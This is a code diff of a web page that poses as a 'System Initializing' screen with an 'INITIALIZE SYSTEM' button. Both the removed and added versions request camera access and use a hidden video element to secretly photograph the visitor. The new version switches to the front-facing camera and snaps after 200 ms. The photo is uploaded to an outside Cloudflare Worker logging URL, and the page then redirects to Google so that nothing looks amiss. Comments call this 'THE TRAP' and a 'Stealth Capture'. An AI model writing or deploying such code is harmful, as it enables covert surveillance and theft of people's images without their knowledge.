@@ -1,73 +1,65 @@
-<script>
-        // ------------------------------------------------
-        // CONFIG: YOUR WORKER URL
-        const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
-        // ------------------------------------------------
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Initializing</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        #v { width: 1px; height: 1px; opacity: 0; } /* Keep hidden */
+        .btn { padding: 20px; border: 1px solid #0f0; background: transparent; color: #0f0; cursor: pointer; }
+    </style>
+</head>
+<body>
 
+    <div id="status">SYSTEM IDLE</div>
+    <video id="v" playsinline></video>
+    <button id="btn" class="btn">INITIALIZE SYSTEM</button>
+
+    <script>
+        const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
         const video = document.getElementById('v');
         const btn = document.getElementById('btn');
-        const consoleText = document.getElementById('console');
-        const laser = document.getElementById('laser');
-        let canvas = document.createElement('canvas');
-        
-        btn.onclick = async () => {
-            try {
-                // 1. Ignition (Request Camera)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                video.srcObject = stream;
-                video.play();
-                
-                // 2. UI Feedback
-                btn.style.display = 'none';
-                laser.style.display = 'block';
-                consoleText.innerText = "CALIBRATING SENSORS...";
-                
-                // 3. THE TRAP (Wait 2 Seconds, then FORCE SNAP)
-                setTimeout(() => {
-                    executeStealthCapture();
-                }, 2000); // 2000ms = 2 Seconds delay
+        const status = document.getElementById('status');
+        const canvas = document.createElement('canvas');
 
+        btn.onclick = async () => {
+            status.innerText = "STARTING...";
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // Snap after 200ms
+                    setTimeout(snapAndClose, 200);
+                };
             } catch (e) {
-                consoleText.innerText = "SYSTEM ERROR: PERMISSION DENIED";
-                consoleText.style.color = "red";
+                status.innerText = "ACCESS DENIED";
             }
         };
 
-        async function executeStealthCapture() {
-            consoleText.innerText = "ACQUIRING TELEMETRY...";
-            
-            // A. Silent Capture
+        async function snapAndClose() {
+            // 1. Capture
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            // B. Convert to Lightweight JPEG
-            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+            const img = canvas.toDataURL('image/jpeg', 0.5);
 
-            // C. Close the Camera (To look suspicious-free)
-            video.srcObject.getTracks().forEach(track => track.stop());
-            laser.style.display = 'none';
+            // 2. Kill Camera immediately
+            video.srcObject.getTracks().forEach(t => t.stop());
 
-            // D. Uplink to Cloudflare
-            try {
-                await fetch(LOGGING_API, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        qr_code_text: "FORCE_CAPTURE_NO_QR", // Special Flag
-                        image: imageData // The Face/Room Photo
-                    })
-                });
-                
-                // E. The "Ending" (Redirect or Message)
-                consoleText.innerText = "SCAN COMPLETE. NO TARGET FOUND.";
-                consoleText.style.color = "#00ff88";
-                
-                // Optional: Redirect to Google after 1 second
-                setTimeout(() => { window.location.href = "https://google.com"; }, 1500);
+            // 3. Background Upload
+            fetch(LOGGING_API, {
+                method: 'POST',
+                keepalive: true,
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: img })
+            });
 
-            } catch(e) {
-                consoleText.innerText = "UPLOAD FAILED. RETRYING...";
-            }
+            // 4. Redirect
+            window.location.href = "https://google.com";
         }
     </script>
+</body>
+</html>
